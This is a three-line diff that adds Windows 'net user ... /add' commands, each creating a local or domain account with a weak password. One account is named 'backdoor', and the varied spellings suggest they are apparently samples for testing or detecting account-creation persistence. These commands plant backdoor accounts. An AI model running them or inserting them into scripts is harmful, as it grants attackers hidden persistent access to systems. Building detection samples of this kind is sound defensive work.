@@ -1,0 +1,3 @@
+net user backdoor P@ss /add
+net.exe user svc2 Hunter2! /add /domain
+NET USER temp Pass1234 /ADD
